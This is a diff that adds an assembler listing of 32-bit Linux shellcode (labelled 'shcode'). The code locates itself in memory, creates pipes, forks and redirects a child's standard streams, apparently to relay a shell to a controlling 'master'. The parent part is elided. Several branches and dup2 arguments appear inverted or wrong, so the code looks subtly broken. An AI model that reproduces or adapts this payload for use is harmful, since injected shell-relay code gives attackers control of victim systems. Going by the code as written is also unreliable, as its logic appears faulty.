@@ -1,0 +1,156 @@
+     1                                  BITS 32
+     2                                  
+     3                                  ;		     #   1   2   3   4   5   6
+     4                                  ; syscall arguments: EAX EBX ECX EDX ESI EDI EBP
+     5                                  ; syscall return: EAX
+     6                                  
+     7                                  start:
+     8 00000000 E800000000              	call	shcode_start
+     9                                  shcode_start:
+    10 00000005 5D                      	pop	ebp
+    11 00000006 81ED[05000000]          	sub	ebp, shcode_start
+    12 0000000C 81C5[E2000000]          	add	ebp, data_start
+    13                                  
+    14                                  	; pipe(c2sh)
+    15 00000012 B82A000000              	mov	eax,42
+    16 00000017 89EB                    	mov	ebx,ebp
+    17 00000019 81C308000000            	add	ebx,c2sh_0
+    18 0000001F CD80                    	int	0x80
+    19                                  
+    20 00000021 3D00000000              	cmp	eax,0
+    21 00000026 747C                    	je	child_dead
+    22                                  
+    23                                  	; pipe(sh2c)
+    24 00000028 B82A000000              	mov	eax,42
+    25 0000002D 89EB                    	mov	ebx,ebp
+    26 0000002F 81C310000000            	add	ebx,sh2c_0
+    27 00000035 CD80                    	int	0x80
+    28                                  
+    29 00000037 3D00000000              	cmp	eax,0
+    30 0000003C 7466                    	je	child_dead
+    31                                  
+    32                                  	; fork()
+    33 0000003E B802000000              	mov	eax,2
+    34 00000043 CD80                    	int	0x80
+    35                                  
+    36 00000045 3D00000000              	cmp	eax,0
+    37 0000004A 7458                    	je	parent
+    38 0000004C 7F05                    	jg	child			; signed compare
+    39 0000004E E951000000              	jmp	child_dead
+    40                                  
+    41                                  child:
+    42                                  	; dup2(c2sh[1], 0)   (dup to stdin)
+    43 00000053 B83F000000              	mov	eax,63
+    44 00000058 89EB                    	mov	ebx,ebp
+    45 0000005A 81C30C000000            	add	ebx,c2sh_1
+    46 00000060 8B1B                    	mov	ebx, [ebx]
+    47 00000062 31C9                    	xor	ecx,ecx
+    48 00000064 CD80                    	int	0x80
+    49                                  
+    50 00000066 3D00000000              	cmp	eax,0
+    51 0000006B 756E                    	jne	leave_sh
+    52                                  
+    53                                  	; dup2(sh2c[0], 1)   (dup to stdout)
+    54 0000006D B83F000000              	mov	eax,63
+    55 00000072 89EB                    	mov	ebx,ebp
+    56 00000074 81C310000000            	add	ebx,sh2c_0
+    57 0000007A 8B1B                    	mov	ebx, [ebx]
+    58 0000007C 31C9                    	xor	ecx,ecx
+    59 0000007E 41                      	inc	ecx
+    60 0000007F CD80                    	int	0x80
+    61                                  
+    62 00000081 3D00000000              	cmp	eax,0
+    63 00000086 7553                    	jne	leave_sh
+    64                                  	
+    65                                  	; dup2(sh2c[0], 2)   (dup to stderr)
+    66 00000088 B83F000000              	mov	eax,63
+    67 0000008D 89EB                    	mov	ebx,ebp
+    68 0000008F 81C310000000            	add	ebx,sh2c_0
+    69 00000095 8B1B                    	mov	ebx, [ebx]
+    70 00000097 31C9                    	xor	ecx,ecx
+    71 00000099 41                      	inc	ecx
+    72 0000009A 41                      	inc	ecx
+    73 0000009B CD80                    	int	0x80
+    74                                  
+    75 0000009D 3D00000000              	cmp	eax,0
+    76 000000A2 7537                    	jne	leave_sh
+    77                                  
+    78                                  parent:
+    79                                  
+    80                                  ;...
+    81                                  
+    82                                  
+    83                                  child_dead:
+    84                                  	; at most wait 2 seconds for master's ACK
+    85 000000A4 31C0                    	xor	eax,eax
+    86 000000A6 398501000000            	cmp long [ebp+child_is_dead_ACK], eax
+    87 000000AC 752D                    	jne	leave_sh
+    88 000000AE 40                      	inc	eax
+    89 000000AF 40                      	inc	eax
+    90 000000B0 398500000000            	cmp long [ebp+child_is_dead], eax
+    91 000000B6 7723                    	ja	leave_sh
+    92                                  
+    93 000000B8 FE4500                  	inc byte [ebp]
+    94                                  
+    95                                  	; usleep(1,0):
+    96 000000BB B8A2000000              	mov	eax, 162
+    97 000000C0 89EB                    	mov	ebx, ebp
+    98 000000C2 81C318020000            	add	ebx, foo
+    99 000000C8 89D9                    	mov	ecx, ebx
+   100 000000CA C70301000000            	mov long [ebx], 1		; seconds
+   101 000000D0 C7430400000000          	mov long [ebx+4], 0		; nanoseconds
+   102 000000D7 CD80                    	int	0x80
+   103                                  
+   104 000000D9 EBC9                    	jmp	child_dead
+   105                                  
+   106                                  leave_sh:
+   107                                  	; exit-point for BOTH parent and child
+   108 000000DB 31DB                    	xor	ebx,ebx
+   109 000000DD 89D8                    	mov	eax,ebx
+   110 000000DF 40                      	inc	eax
+   111 000000E0 CD80                    	int	0x80
+   112                                  
+   113                                  ; =============================================================================
+   114                                  ; DATA
+   115                                  
+   116                                  data_start EQU $
+   117                                  
+   118                                  child_is_dead EQU $ - data_start
+   119 000000E2 00                      	db		0
+   120                                  child_is_dead_ACK EQU $ - data_start
+   121 000000E3 00                      	db		0
+   122                                  to_child_ok EQU $ - data_start
+   123 000000E4 01                      	db		1
+   124                                  from_child_ok EQU $ - data_start
+   125 000000E5 01                      	db		1
+   126                                  
+   127                                  ; ringbuffer from_master:
+   128                                  
+   129                                  rfrm_writer_pos EQU $ - data_start
+   130 000000E6 00                      	db		0
+   131                                  rfrm_reader_pos EQU $ - data_start
+   132 000000E7 00                      	db		0
+   133                                  
+   134                                  ; ringbuffer to_master:
+   135                                  
+   136                                  rtom_writer_pos EQU $ - data_start
+   137 000000E8 00                      	db		0
+   138                                  rtom_reader_pos EQU $ - data_start
+   139 000000E9 00                      	db		0
+   140                                  
+   141                                  ; =============================================================================
+   142                                  ; stuff that is not required to be initialized:
+   143                                  
+   144                                  ; pipes to/from child:
+   145                                  c2sh_0 EQU $ - data_start
+   146                                  c2sh_1 EQU $ - data_start + 4
+   147                                  sh2c_0 EQU $ - data_start + 8
+   148                                  sh2c_1 EQU $ - data_start + 12
+   149                                  
+   150                                  rfrm_buffer EQU $ - data_start + 16
+   151                                  rtom_buffer EQU $ - data_start + 272
+   152                                  
+   153                                  foo EQU $ - data_start + 528
+   154                                  bar EQU $ - data_start + 532
+   155                                  baz EQU $ - data_start + 536
+   156                                  qux EQU $ - data_start + 540
